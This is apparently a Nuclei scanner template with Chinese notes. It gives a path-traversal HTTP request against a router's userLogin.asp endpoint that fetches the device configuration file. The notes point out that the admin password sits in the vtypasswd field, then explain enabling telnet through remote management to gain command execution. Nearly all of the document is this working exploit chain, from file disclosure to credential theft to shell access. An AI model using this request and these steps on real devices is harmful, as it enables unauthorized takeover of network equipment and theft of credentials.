http:
- raw:
  - '访问userLog in.asp/actionpalicy_status1./xxxx.cfg 接口，xxxx为设备型号（比如设备型号为 ER5200G2 ，即访问userLog in.asp/../actionpolicy_status/../ER5200G2.cfg）根据设备型号修改payload


    GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1

    User-Agent: Java/1.8.0_381

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Connection: close

    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744553924196-b9b48154-5512-4f37-8e3e-07da0a0cb89d.png)

    密码就在<font style="color:rgba(0, 0, 0, 0.9);">vtypasswd</font>字段

    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744553924370-2df5c55c-0d96-4c2d-ae68-a953d168ea76.png)

    账户为admin

    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744553924634-6ab2782d-cdc8-4554-b73c-77ed29b88dad.png)

    可在远程管理->远程telnet管理处开启telnet获取命令执行权限

    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1744553924853-c82d659a-6cbe-4d82-8b6d-8d92e6c4c4da.png)'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
